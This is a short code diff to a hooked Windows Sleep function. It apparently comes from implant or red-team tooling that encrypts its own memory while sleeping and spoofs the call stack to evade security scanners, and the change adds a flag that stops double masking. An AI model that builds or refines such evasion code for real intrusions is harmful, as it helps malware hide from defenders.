@@ -68,14 +68,16 @@ VOID WINAPI _Sleep ( DWORD dwMilliseconds )
      * or greater than 1 second 
      */
 
-    if ( dwMilliseconds >= 1000 ) {
+    if ( dwMilliseconds >= 1000 && !g_memory.isEncrypted ) {
         mask_memory ( &g_memory, TRUE );
+        g_memory.isEncrypted = TRUE;
     }
 
     spoof_call ( &call );
 
-    if ( dwMilliseconds >= 1000 ) {
+    if (  g_memory.isEncrypted ) {
         mask_memory ( &g_memory, FALSE );
+        g_memory.isEncrypted = FALSE;
     }
 }
 
